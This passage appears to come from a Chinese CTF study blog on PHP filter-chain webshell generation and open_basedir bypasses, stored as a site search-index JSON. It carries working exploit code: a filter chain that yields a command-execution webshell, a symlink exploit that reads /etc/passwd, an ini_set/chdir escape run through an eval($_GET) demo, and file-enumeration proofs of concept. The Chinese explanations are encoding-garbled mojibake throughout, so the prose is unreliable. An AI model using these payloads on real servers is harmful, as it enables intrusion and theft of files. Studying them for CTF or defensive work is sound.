\u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; ); $filters = \u0026#34;convert.base64-encode|\u0026#34;; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file $filters .= \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34;; foreach (str_split(strrev($base64_payload)) as $c) { $filters .= $conversions[$c] . \u0026#34;|\u0026#34;; $filters .= \u0026#34;convert.base64-decode|\u0026#34;; $filters .= \u0026#34;convert.base64-encode|\u0026#34;; $filters .= \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34;; } $filters .= \u0026#34;convert.base64-decode\u0026#34;; $final_payload = \u0026#34;php://filter/{$filters}/resource=data://,aaaaaaaaaaaaaaaaaaaa\u0026#34;; // echo $final_payload; var_dump(file_get_contents($final_payload)); // hexdump // 00000000 73 74 72 69 6e 67 28 31 38 29 20 22 3c 3f 3d 60 |string(18) \u0026#34;\u0026lt;?=`| // 00000010 24 5f 47 45 54 5b 30 5d 60 3b 3b 3f 3e 18 22 0a |$_GET[0]`;;?\u0026gt;.\u0026#34;.| å¯ä»¥çœ‹åˆ°è¿™é‡Œä¸æ–­çš„åˆ©ç”¨ç¼–ç å’Œè½¬ç è¿›è¡Œè½¬åŒ–åˆ©ç”¨base64çš„å®½æ¾æ€§æ¥æ„é€ å‡ºé©¬å­ å‰©ä¸‹çš„é‚£äº›é¢˜ç›®å°±è‡ªå·±å»çœ‹å§hhh å½“ç„¶æœ‰äº›å¸ˆå‚…æœ‰å¤´ç–¼ï¼Œé‚£æˆ‘æ€ä¹ˆçŸ¥é“ç»è¿‡ä»€ä¹ˆè½¬åŒ–èƒ½å˜æˆæˆ‘è¦çš„ä¸œè¥¿å‘€ï¼Œè¿™é‡Œè´´ä¸€ä¸ªä¼ é€é—¨hhï¼Œä¸€ä¸ªfuzzçš„ä»£ç  https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT tql wupcoå¸ˆå‚…\nç¬¬ä¸‰ç§ç±»å‹ #\rfile_put_contents($filename,$content . \u0026quot;\\nxxxxxx\u0026quot;); è¿™é‡Œä¹Ÿå°±æ¯”è¾ƒç®€å•ï¼Œå…¶å®å°±æ˜¯å¯¹åé¢çš„æ‚ç³…å†…å®¹è¿›è¡Œæ³¨é‡Šï¼Œä½†æ˜¯é¢˜ç›®è‚¯å®šä¼šåšé™åˆ¶ï¼Œæ‰€ä»¥ä¹Ÿæœ‰å…¶ä»–æ–¹æ³•ï¼Œä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨å†™å…¥.htaccessæ–‡ä»¶è¿›è¡Œé¢„åŒ…å«å°†åé¢çš„æ‚ç³…è¯­å¥æ³¨é‡Šæ‰å³å¯\n(å¥½ç´¯å•Šå¥½ç´¯å•Šè¿™é‡Œæœ€åä¸€ä¸ªçŸ¥è¯†ç‚¹ç›´æ¥è´´å¤§Bå“¥çš„)\n0x04php://temp #\råœ¨è¿™é‡Œæ’å…¥ä¸€æ¡çŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯tempå’Œmemoryä¼ªåè®®ï¼š\nphp://memoryÂ å’ŒÂ php://tempÂ æ˜¯ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶ åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php://memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œ è€Œ php://temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´\nphp://temp çš„å†…å­˜é™åˆ¶å¯é€šè¿‡æ·»åŠ  /maxmemory:NN æ¥æ§åˆ¶ï¼ŒNN æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½ã€ä¿ç•™åœ¨å†…å­˜çš„æœ€å¤§æ•°æ®é‡ï¼Œè¶…è¿‡åˆ™ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶\n$fiveMBs = 5 * 1024 * 1024; $fp = fopen(\u0026#34;php://temp/maxmemory:$fiveMBs\u0026#34;, \u0026#39;r+\u0026#39;); fputs($fp, \u0026#34;hello\\n\u0026#34;); // è¯»å–å†™å…¥çš„æ•°æ®. rewind($fp); echo stream_get_contents($fp); php://memory å’Œ php://temp æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œæ¯”å¦‚ï¼šstream æµå…³é—­åï¼Œå°±æ— æ³•å†æ¬¡å¾—åˆ°ä»¥å‰çš„å†…å®¹äº†\nfile_put_contents(\u0026#39;php://memory\u0026#39;, \u0026#39;PHP\u0026#39;); echo file_get_contents(\u0026#39;php://memory\u0026#39;); // å•¥ä¹Ÿæ²¡æœ‰ å‚è€ƒæ–‡ç« ï¼š 1ã€ https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#Filterchain%E6%9E%84%E9%80%A0%EF%BC%88%E5%8E%9F%E7%90%86%E9%98%90%E8%BF%B0%EF%BC%89 2ã€ https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx\u0026alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6 3ã€ https://tttang.com/archive/1395/\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/filter-chain-learning/","section":"Posts","summary":"","title":"Filter Chain learning","type":"posts"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/hash/","section":"Tags","summary":"","title":"Hash","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"å‰è¨€ #\remmæœ€è¿‘åˆ·é¢˜å‘¢ï¼Œä¹‹å‰éƒ½æ²¡æœ‰ç³»ç»Ÿåˆ·è¿‡é¢˜ç›®æ‰€ä»¥æœ‰äº›çŸ¥è¯†ç‚¹å°±æ²¡æœ‰å­¦ä¹ ï¼Œç°åœ¨å°±æ¥ä¸€ç‚¹ç‚¹è¡¥ä¸Šï¼Œè¿˜æ˜¯å¤ªèœäº†\nintroduction #\rOpen_basediræ˜¯PHPè®¾ç½®ä¸­ä¸ºäº†é˜²å¾¡PHPè·¨ç›®å½•è¿›è¡Œæ–‡ä»¶ï¼ˆç›®å½•ï¼‰è¯»å†™çš„æ–¹æ³•ï¼Œæ‰€æœ‰PHPä¸­æœ‰å…³æ–‡ä»¶è¯»ã€å†™çš„å‡½æ•°éƒ½ä¼šç»è¿‡open_basedirçš„æ£€æŸ¥ã€‚Open_basedirå®é™…ä¸Šæ˜¯ä¸€äº›ç›®å½•çš„é›†åˆï¼Œåœ¨å®šä¹‰äº†open_basedirä»¥åï¼Œphpå¯ä»¥è¯»å†™çš„æ–‡ä»¶ã€ç›®å½•éƒ½å°†è¢«é™åˆ¶åœ¨è¿™äº›ç›®å½•ä¸­ã€‚\nè®¾ç½®open_basedirçš„æ–¹æ³•ï¼Œåœ¨linuxä¸‹ï¼Œä¸åŒçš„ç›®å½•ç”±â€œ:â€åˆ†å‰²ï¼Œå¦‚â€œ/var/www/:/tmp/â€ï¼›åœ¨Windowsä¸‹ä¸åŒç›®å½•ç”±â€œ;â€åˆ†å‰²ï¼Œå¦‚â€œc:/www;c:/windows/tempâ€ã€‚ å¯ä»¥åœ¨php.inié…ç½®æ–‡ä»¶ä¸­è¿›è¡Œé…ç½®\nglobe://ä¼ªåè®® #\ré‚£ä¹ˆåœ¨ä½¿ç”¨è¿™ä¸ªåè®®ä¹‹å‰é‚£è‚¯å®šå¾—çŸ¥é“è¿™ä¸ªåè®®æ˜¯ä»€ä¹ˆå§ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯å»çœ‹äº†ä¸€ä¸‹phpçš„doc https://www.php.net/manual/zh/wrappers.glob.php\nSimple Globe:// #\rå¯ä»¥çœ‹è§å®˜æ–¹ç»™å‡ºçš„demo\n\u0026lt;?php // å¾ªç¯ ext/spl/examples/ ç›®å½•é‡Œæ‰€æœ‰ *.php æ–‡ä»¶ // å¹¶æ‰“å°æ–‡ä»¶åå’Œæ–‡ä»¶å°ºå¯¸ $it = new DirectoryIterator(\u0026#34;glob://ext/spl/examples/*.php\u0026#34;); foreach($it as $f) { printf(\u0026#34;%s: %.1FK\\n\u0026#34;, $f-\u0026gt;getFilename(), $f-\u0026gt;getSize()/1024); } ?\u0026gt; è¿™ä¸ªåªåšä¸€ä¸ªå¼•å…¥ï¼Œå› ä¸ºå•çº¯çš„ä½¿ç”¨globeä¼ªåè®®æ˜¯æ²¡æœ‰åŠæ³•ç»•è¿‡çš„ï¼Œå¹¶ä¸”ä¸èƒ½åˆ—å‡ºå‰é¢çš„ç›®å½•ä»¥åŠä»¥å¤–çš„æ–‡ä»¶ï¼Œæ›´ä¸èƒ½è¯»å–æ–‡ä»¶å†…å®¹æ‰€ä»¥å•çº¯çš„ä½¿ç”¨å¹¶æ²¡æœ‰ä»€ä¹ˆå¥½ç©çš„\nDiretorylterator + Globe:// #\rå…³äºDiretorylteratorè¿™ä¸ªç±»çš„ä¸€äº›ä»‹ç»ï¼š https://www.php.net/manual/zh/class.directoryiterator.php php5ä¸­å¢åŠ çš„ä¸€ä¸ªç±»ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç®€å•çš„æŸ¥çœ‹ç›®å½•çš„æ¥å£ demo2:\n$result = array{}; $mulu =new Diretorylterator(\u0026#34;globle:///*\u0026#34;); foreach($mulu as $a){ $result = $a-\u0026gt;__toString(); } sort($result); foreach($result as $s){ echo \u0026#34;{$s}\u0026lt;br/\u0026gt;\u0026#34;; } è¿™é‡Œè‡ªå·±æ‰“äº†ä¸€éï¼Œå› ä¸ºä¸æƒ³è´´åˆ«äººçš„ä»£ç \u0026hellip;ï¼ˆä¸»è¦æ˜¯è‡ªå·±æ‰“ä¸€éæ¯”è¾ƒå¥½ï¼‰,ç»•è¿‡æ¡ä»¶ï¼šPHP\u0026gt;5.3 \u0026amp;\u0026amp; Linuxç¯å¢ƒä¸‹æ‰å¯\nopendir()+readdir()+glob:// #\ropendir()\u0026ndash;\u0026gt;æ‰“å¼€ç›®å½• readdir()-\u0026gt;è¿”å›ç›®å½•ä¸­ä¸‹ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶åã€‚æ–‡ä»¶åä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ’åºè¿”å›ã€‚ æ‰€ä»¥è„šæœ¬å¦‚ä¸‹\n\u0026lt;?php $a = $_GET[\u0026#39;c\u0026#39;]; if ( $b = opendir($a) ) { while ( ($file = readdir($b)) !== false ) { echo $file.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } closedir($b); } ?\u0026gt; scandir()+glob:// #\rå…³äºè¿™ä¸ªè§£æ³•æˆ‘ä¸æ‰“ç®—å»çœ‹å› ä¸ºè¿™ä¸ªä¹Ÿæ˜¯å¥½åƒç»•ä¸äº†open_basedirçš„ å¼•ç”¨ï¼šâ€œè¿™ç§æ–¹æ³•ä¹Ÿåªèƒ½åˆ—å‡ºæ ¹ç›®å½•å’Œopen_basedirå…è®¸ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚â€œ\nsymlinkç»•è¿‡ #\rsymlink()å‡½æ•°åˆ›å»ºä¸€ä¸ªä»æŒ‡å®šåç§°è¿æ¥çš„ç°å­˜ç›®æ ‡æ–‡ä»¶å¼€å§‹çš„ç¬¦å·è¿æ¥ã€‚ï¼š https://www.php.net/manual/zh/function.symlink.php ç”¨æ³•ï¼š symlink(string $target, string $link): bool\n\u0026lt;?php mkdir(\u0026#34;A\u0026#34;); chdir(\u0026#34;A\u0026#34;); mkdir(\u0026#34;B\u0026#34;); chdir(\u0026#34;B\u0026#34;); mkdir(\u0026#34;C\u0026#34;); chdir(\u0026#34;C\u0026#34;); mkdir(\u0026#34;D\u0026#34;); chdir(\u0026#34;D\u0026#34;); chdir(\u0026#34;..\u0026#34;); chdir(\u0026#34;..\u0026#34;); chdir(\u0026#34;..\u0026#34;); chdir(\u0026#34;..\u0026#34;); symlink(\u0026#34;A/B/C/D\u0026#34;,\u0026#34;SD\u0026#34;); symlink(\u0026#34;SD/../../../../etc/passwd\u0026#34;,\u0026#34;POC\u0026#34;); unlink(\u0026#34;SD\u0026#34;); mkdir(\u0026#34;SD\u0026#34;); ?\u0026gt; è¿™é‡Œçš„åŸç†å°±æ˜¯é€šè¿‡è½¯è¿æ¥ä½œä¸ºä¸€ä¸ªæ¡¥æ¢æ¥è¿›è¡Œç»•è¿‡ å…·ä½“çš„æ€è·¯å¦‚ä¸‹ï¼š\nåˆ›å»ºäº†A/B/C/Dè¿™ä¸ªç›®å½• åˆ›å»ºSDè½¯é“¾æ¥åˆ°ç›®å½•A/B/C/D ç„¶åè®©POCæŒ‡å‘SDä¸Šé¢çš„ç›®å½•è¿™ä¸ªæ—¶å€™å› ä¸ºè¿”å›å../../../../åˆšå¥½å›åˆ°open_basediré™åˆ¶çš„htmlç›®å½•ä¸‹é¢æ‰€ä»¥è¿™é‡Œæ²¡æ¯›ç—… ç„¶ååˆ é™¤äº†SDè½¯é“¾æ¥åˆåˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶å¤¹è¿™ä¸ªæ—¶å€™POCæŒ‡å‘çš„å°±æ˜¯: var/www/html/SD/../../../../etc/passwdä»è€Œè¿›è¡Œç»•è¿‡ï¼ˆè¿™ä¸ªæ€è·¯ç¡®å®å¥½ç©ï¼‰ expå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆä¹Ÿæ˜¯è´´è´´ \u0026lt;?php /* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */ header(\u0026#39;content-type: text/plain\u0026#39;); error_reporting(-1); ini_set(\u0026#39;display_errors\u0026#39;, TRUE); printf(\u0026#34;open_basedir: %s\\nphp_version: %s\\n\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;), phpversion()); printf(\u0026#34;disable_functions: %s\\n\u0026#34;, ini_get(\u0026#39;disable_functions\u0026#39;)); $file = str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, isset($_REQUEST[\u0026#39;file\u0026#39;]) ? $_REQUEST[\u0026#39;file\u0026#39;] : \u0026#39;/etc/passwd\u0026#39;); $relat_file = getRelativePath(__FILE__, $file); $paths = explode(\u0026#39;/\u0026#39;, $file); $name = mt_rand() % 999; $exp = getRandStr(); mkdir($name); chdir($name); for($i = 1 ; $i \u0026lt; count($paths) - 1 ; $i++){ mkdir($paths[$i]); chdir($paths[$i]); } mkdir($paths[$i]); for ($i -= 1; $i \u0026gt; 0; $i--) { chdir(\u0026#39;..\u0026#39;); } $paths = explode(\u0026#39;/\u0026#39;, $relat_file); $j = 0; for ($i = 0; $paths[$i] == \u0026#39;..\u0026#39;; $i++) { mkdir($name); chdir($name); $j++; } for ($i = 0; $i \u0026lt;= $j; $i++) { chdir(\u0026#39;..\u0026#39;); } $tmp = array_fill(0, $j + 1, $name); symlink(implode(\u0026#39;/\u0026#39;, $tmp), \u0026#39;tmplink\u0026#39;); $tmp = array_fill(0, $j, \u0026#39;..\u0026#39;); symlink(\u0026#39;tmplink/\u0026#39; . implode(\u0026#39;/\u0026#39;, $tmp) . $file, $exp); unlink(\u0026#39;tmplink\u0026#39;); mkdir(\u0026#39;tmplink\u0026#39;); delfile($name); $exp = dirname($_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;]) . \u0026#34;/{$exp}\u0026#34;; $exp = \u0026#34;http://{$_SERVER[\u0026#39;SERVER_NAME\u0026#39;]}{$exp}\u0026#34;; echo \u0026#34;\\n-----------------content---------------\\n\\n\u0026#34;; echo file_get_contents($exp); delfile(\u0026#39;tmplink\u0026#39;); function getRelativePath($from, $to) { // some compatibility fixes for Windows paths $from = rtrim($from, \u0026#39;\\/\u0026#39;) . \u0026#39;/\u0026#39;; $from = str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, $from); $to = str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, $to); $from = explode(\u0026#39;/\u0026#39;, $from); $to = explode(\u0026#39;/\u0026#39;, $to); $relPath = $to; foreach($from as $depth =\u0026gt; $dir) { // find first non-matching dir if($dir === $to[$depth]) { // ignore this directory array_shift($relPath); } else { // get number of remaining dirs to $from $remaining = count($from) - $depth; if($remaining \u0026gt; 1) { // add traversals up to first matching dir $padLength = (count($relPath) + $remaining - 1) * -1; $relPath = array_pad($relPath, $padLength, \u0026#39;..\u0026#39;); break; } else { $relPath[0] = \u0026#39;./\u0026#39; . $relPath[0]; } } } return implode(\u0026#39;/\u0026#39;, $relPath); } function delfile($deldir){ if (@is_file($deldir)) { @chmod($deldir,0777); return @unlink($deldir); }else if(@is_dir($deldir)){ if(($mydir = @opendir($deldir)) == NULL) return false; while(false !== ($file = @readdir($mydir))) { $name = File_Str($deldir.\u0026#39;/\u0026#39;.$file); if(($file!=\u0026#39;.\u0026#39;) \u0026amp;\u0026amp; ($file!=\u0026#39;..\u0026#39;)){delfile($name);} } @closedir($mydir); @chmod($deldir,0777); return @rmdir($deldir) ? true : false; } } function File_Str($string) { return str_replace(\u0026#39;//\u0026#39;,\u0026#39;/\u0026#39;,str_replace(\u0026#39;\\\\\u0026#39;,\u0026#39;/\u0026#39;,$string)); } function getRandStr($length = 6) { $chars = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $randStr = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); } return $randStr; } realpathåˆ—ä¸¾ç›®å½• #\rRealpathå‡½æ•°æ˜¯phpä¸­å°†ä¸€ä¸ªè·¯å¾„è§„èŒƒåŒ–æˆä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚ butï¼Œåœ¨å¼€å¯äº†open_basedirä»¥åï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸ªç‰¹ç‚¹ï¼šå½“æˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œå®ƒå°†è¿”å›falseï¼›å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨open_basediré‡Œçš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œä»–å°†æŠ›å‡ºé”™è¯¯ï¼ˆFile is not within the allowed path(s)ï¼‰ã€‚ æ‰€ä»¥å°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡ŒçŒœè§£ï¼Œè€ƒè™‘åˆ°æ•ˆç‡é—®é¢˜ï¼Œæ‰€ä»¥åˆ©ç”¨äº†Windowsä¸‹çš„é€šé…ç¬¦\n\u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); printf(\u0026#34;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;)); //æ‰“å°äº†å½“å‰opené™åˆ¶çš„ç›®å½• set_error_handler(\u0026#39;isexists\u0026#39;); $dir = \u0026#39;d:/test/\u0026#39;; $file = \u0026#39;\u0026#39;; $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39;; for ($i=0; $i \u0026lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026lt;\u0026#39;; realpath($file); } function isexists($errno, $errstr) { $regexp = \u0026#39;/File\\((.*)\\) is not within/\u0026#39;; preg_match($regexp, $errstr, $matches); if (isset($matches[1])) { printf(\u0026#34;%s \u0026lt;br/\u0026gt;\u0026#34;, $matches[1]); } } ?\u0026gt; è„šæœ¬å¯ä»¥åˆ—å‡ºD:/test/ä¸‹çš„æ–‡ä»¶ç›®å½•ï¼Œå½“ç„¶è¿™ä¸ªåªåœ¨Windowsä¸‹é€‚ç”¨åœ¨linuxä¸‹é¢ä¸é€‚ç”¨ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯ä¸èƒ½åˆ—å‡ºæ¥é¦–å­—æ¯ç›¸åŒçš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—æ”¹è¿›ä¸€ä¸‹pç¥çš„è„šæœ¬\n\u0026lt;?php // è®¾ç½® open_basedir æŒ‡ä»¤ ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); // æ‰“å° open_basedir é™åˆ¶ echo \u0026#34;\u0026lt;b\u0026gt;open_basedir: \u0026#34; . ini_get(\u0026#39;open_basedir\u0026#39;) . \u0026#34;\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;; // å®šä¹‰è‡ªå®šä¹‰é”™è¯¯å¤„ç†ç¨‹åº set_error_handler(\u0026#39;isexists\u0026#39;); // ç›®å½•å’Œå­—ç¬¦ $dir = \u0026#39;d:/test/\u0026#39;; $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39;; // è¿­ä»£å­—ç¬¦ for ($i = 0; $i \u0026lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026#39;; if (file_exists($file)) { // å°è¯•è®¿é—®æ–‡ä»¶ $realpath = realpath($file); if ($realpath === false) { // æ–‡ä»¶æ— æ³•è®¿é—® trigger_error(\u0026#34;File $file is not within allowed directories.\u0026#34;, E_USER_WARNING); } } // å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦çš„é¦–å­—æ¯ä¸å½“å‰å­—ç¬¦çš„é¦–å­—æ¯ç›¸åŒï¼Œåˆ™è·³è¿‡ while ($i \u0026lt; strlen($chars) - 1 \u0026amp;\u0026amp; $chars[$i] == $chars[$i + 1]) { $i++; } } // è‡ªå®šä¹‰é”™è¯¯å¤„ç†ç¨‹åºå‡½æ•° function isexists($errno, $errstr) { $regexp = \u0026#39;/File\\((.*)\\) is not within/\u0026#39;; if (preg_match($regexp, $errstr, $matches)) { echo \u0026#34;{$matches[1]}\u0026lt;br /\u0026gt;\u0026#34;; } } ?\u0026gt; åˆ©ç”¨SplFileInfo::getRealPath()åˆ—ä¸¾ç›®å½• #\rSplFileInfoç±»æ˜¯PHP5.1.2ä¹‹åå¼•å…¥çš„ä¸€ä¸ªç±»ï¼Œæä¾›ä¸€ä¸ªå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œçš„æ¥å£ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªå’Œrealpathåå­—å¾ˆåƒçš„æ–¹æ³•å«getRealPathã€‚\nè¿™ä¸ªæ–¹æ³•åŠŸèƒ½å’Œrealpathç±»ä¼¼ï¼Œéƒ½æ˜¯è·å–ç»å¯¹è·¯å¾„ç”¨çš„ã€‚æˆ‘ä»¬åœ¨SplFileInfoçš„æ„é€ å‡½æ•°ä¸­ä¼ å…¥æ–‡ä»¶ç›¸å¯¹è·¯å¾„ï¼Œå¹¶ä¸”è°ƒç”¨getRealPathå³å¯è·å–æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚\nè¿™ä¸ªæ–¹æ³•æœ‰ä¸ªç‰¹ç‚¹ï¼šå®Œå…¨æ²¡æœ‰è€ƒè™‘open_basedirã€‚åœ¨ä¼ å…¥çš„è·¯å¾„ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›falseï¼›åœ¨ä¼ å…¥çš„è·¯å¾„ä¸ºä¸€ä¸ªå­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šæ­£å¸¸è¿”å›ç»å¯¹è·¯å¾„ã€‚ æ‰€ä»¥ä¸åƒrealpathéœ€è¦è€ƒè™‘æ˜¯å¦åœ¨open_basedirä¸‹é¢çš„æ¡ä»¶\nPç¥POC\n\u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); printf(\u0026#34;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;)); $basedir = \u0026#39;D:/test/\u0026#39;; $arr = array(); $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789\u0026#39;; for ($i=0; $i \u0026lt; strlen($chars); $i++) { $info = new SplFileInfo($basedir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026lt;\u0026#39;); $re = $info-\u0026gt;getRealPath(); if ($re) { dump($re); } } function dump($s){ echo $s . \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;; ob_flush(); flush(); } ?\u0026gt; åˆ©ç”¨chdirä¸ini_set #\ré¦–å…ˆè§£é‡Šä¸€ä¸‹ini_set https://www.php.net/manual/zh/function.ini-set è¿™é‡Œå…ˆæ”¾ä¸€ä¸‹demo networkå¸ˆå‚…çš„\n\u0026lt;?php echo \u0026#39;open_basedir: \u0026#39;.ini_get(\u0026#39;open_basedir\u0026#39;).\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;GET: \u0026#39;.$_GET[\u0026#39;c\u0026#39;].\u0026#39;\u0026lt;br\u0026gt;\u0026#39;; eval($_GET[\u0026#39;c\u0026#39;]); echo \u0026#39;open_basedir: \u0026#39;.ini_get(\u0026#39;open_basedir\u0026#39;); ?\u0026gt; EXP:\nmkdir(\u0026#39;sub\u0026#39;);chdir(\u0026#39;sub\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/\u0026#39;);var_dump(scandir(\u0026#39;/\u0026#39;)); ä¸€äº›åˆ†æï¼š https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ å¥½å§æˆ‘å®åœ¨æ˜¯çœ‹ä¸ä¸‹å»åº•å±‚äº†\u0026hellip;è¿˜æ˜¯åŠŸåº•ä¸å¤Ÿ..è¿˜å¾—ç»ƒ\nGDåº“imageftbbox/imagefttext #\rçœ‹äº†ä¸€ä¸‹å…¶å®å’Œå‰é¢çš„realpathä¸€æ ·éƒ½æ˜¯é€šè¿‡ä¸€äº›æŠ¥é”™æ¥è¿›è¡ŒçŒœè§£ å½“æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™phpä¼šæŠ›å‡ºâ€œFile(xxxxx) is not within the allowed path(s)â€é”™è¯¯ã€‚ä½†å½“æ–‡ä»¶ä¸å­˜åœ¨çš„æ—¶å€™ä¼šæŠ›å‡ºâ€œInvalid font filenameâ€é”™è¯¯ã€‚\nPOCï¼š\n\u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, dirname(__FILE__)); printf(\u0026#34;\u0026lt;b\u0026gt;open_basedir: %s\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;)); set_error_handler(\u0026#39;isexists\u0026#39;); $dir = \u0026#39;d:/test/\u0026#39;; $file = \u0026#39;\u0026#39;; $chars = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39;; for ($i=0; $i \u0026lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . \u0026#39;\u0026lt;\u0026gt;\u0026lt;\u0026#39;; //$m = imagecreatefrompng(\u0026#34;zip.png\u0026#34;); //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, \u0026#39;aaa\u0026#39;); imageftbbox(100, 100, $file, \u0026#39;aaa\u0026#39;); } function isexists($errno, $errstr) { global $file; if (stripos($errstr, \u0026#39;Invalid font filename\u0026#39;) === FALSE) { printf(\u0026#34;%s\u0026lt;br/\u0026gt;\u0026#34;, $file); } } ?\u0026gt; bindtextdomainæš´åŠ›æ‰§æ³• #\remmåŸç†è¿˜æ˜¯ä¸€æ ·ä½†æ˜¯é¸¡è‚‹ï¼Œå› ä¸ºWindowsä¸‹é¢é»˜è®¤æ²¡æœ‰è¿™ä¸ªå‡½æ•°\u0026amp;\u0026amp;linuxä¸‹é¢æ˜¯ä¸èƒ½ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œç»•è¿‡æ‰€ä»¥å¦‚æœä¸Šé¢çš„æ–¹æ³•éƒ½æ²¡æœ‰ç”¨æ‰ä¼šè€ƒè™‘è¿™äº›çŒœè§£çš„é—®é¢˜\n\u0026lt;?php 